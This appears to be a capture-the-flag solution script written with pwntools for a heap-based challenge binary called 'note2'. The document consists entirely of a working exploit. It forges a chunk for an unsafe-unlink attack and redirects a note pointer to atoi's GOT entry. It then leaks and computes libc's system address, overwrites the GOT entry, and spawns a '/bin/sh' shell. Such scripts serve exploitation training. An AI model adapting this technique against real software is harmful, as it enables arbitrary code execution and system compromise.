from pwn import *
context(arch='amd64',os='linux')
context.log_level = 'debug'
io = process('./note2')
elf = ELF('./note2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def newnote(size,content):
	io.recvuntil('option--->>\n')
	io.sendline('1')
	io.recvuntil('128)\n')
	io.sendline(str(size))
	io.recvuntil('content:\n')
	io.sendline(content)
	
def shownote(idx):
	io.recvuntil('option--->>\n')
	io.sendline('2')
	io.recvuntil('note:\n')
	io.sendline(str(idx))
	return io.recvuntil('1.New note\n')
	
def editnote(idx,op,content):
	io.recvuntil('option--->>\n')
	io.sendline('3')
	io.recvuntil('note:\n')
	io.sendline(str(idx))
	io.recvuntil('ppend]\n')
	io.sendline(str(op))
	io.recvuntil('TheNewContents:')
	io.sendline(content)
	
def deletenote(idx):
	io.recvuntil('option--->>\n')
	io.sendline('4')
	io.recvuntil(' note:\n')
	io.sendline(str(idx))
	io.recvuntil('cess!\n')
	
io.sendline('dayjun')
io.sendline('dayjun')

name = 0x6020E0
address = 0x602180
ptr = 0x602120

payload = p64(0)+p64(0x20)+p64(ptr-0x18)+p64(ptr-0x10)+p64(0x20)+p64(0x60)
payload = payload.ljust(0x80,'a')
newnote(0x80,payload)

newnote(0,'a'*0x10)

newnote(0x80,'a'*8)
payload = 'a'*0x10+p64(0xa0)+p64(0x90)

deletenote(1)
newnote(0,payload)

#gdb.attach(io,'b *0x400CB3')
#raw_input()
deletenote(2)

atoi_got = elf.got['atoi']
payload = 'a'*0x18+p64(atoi_got)
editnote(0,1,payload)

leak = u64(shownote(0)[11:17].ljust(8,'\x00'))
log.success('atoi address: '+hex(leak))

libc_base = leak - libc.symbols['atoi']
log.success('libc base: '+hex(libc_base))
sys_addr = libc_base + libc.symbols['system']
log.success('system address: '+hex(sys_addr))

payload = p64(sys_addr)
editnote(0,1,payload)

io.sendline('/bin/sh\x00')
io.interactive()
